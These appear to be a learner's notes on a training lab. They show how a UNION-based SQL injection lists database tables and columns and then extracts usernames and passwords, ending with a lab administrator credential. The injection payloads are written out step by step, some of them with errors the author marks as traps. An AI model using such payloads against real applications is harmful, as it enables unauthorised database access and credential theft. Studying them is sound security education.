---
title: Lab 3 - Listing DB contents
updated: 2023-06-06T15:39:17.0000000+01:00
created: 2023-06-04T18:32:35.0000000+01:00
---

![image1](../../../../_resources/image1-14.png)
We need to find the table name that contains credentials. We can do this by searching up the schema from the DB.

***SELECT \* FROM information_schema.tables***

We need to place this in a UNION attack:

'UNION+SELECT+\*,NULL,+*information_schema.tables--*

**TRAP:** Note that \* (all) cannot be used here, we need to specify a table name - I'd think because getting all details wouldn't be a string input thus the column can't read it. Also, do NOT use quotation marks around the "table_name"

'UNION+SELECT+table_name,NULL,+*information_schema.tables--*

*Output:*
![image2](../../../../_resources/image2-13.png)

Out of these, the administrable role authorizations table looks the most interesting.
Grabbing details from a table:

Now that we know all the tables in the database, we need to get the columns and data from them.

***SELECT \* FROM information_schema.columns WHERE table_name = 'Users'***

**'UNION+SELECT+table_name,NULL+FROM+information_schema.tables--**

**TRAP:** Not all the table names appear on the website, you can filter and look in the HTML code for users.

If you look inside the HTML, you can see a table named:
![image3](../../../../_resources/image3-10.png)

We can then look inside the columns of the table:

'UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users_wewmmz'--

![image4](../../../../_resources/image4-7.png)
We then need to look up these tables for details:

***'UNION+SELECT+username_cfmcne,+password_mzfqbr+FROM+users_wewmmz--***
![image5](../../../../_resources/image5-4.png)

Now we have admin creds:

Administrator:4v964lb4fwwvx4relhz3
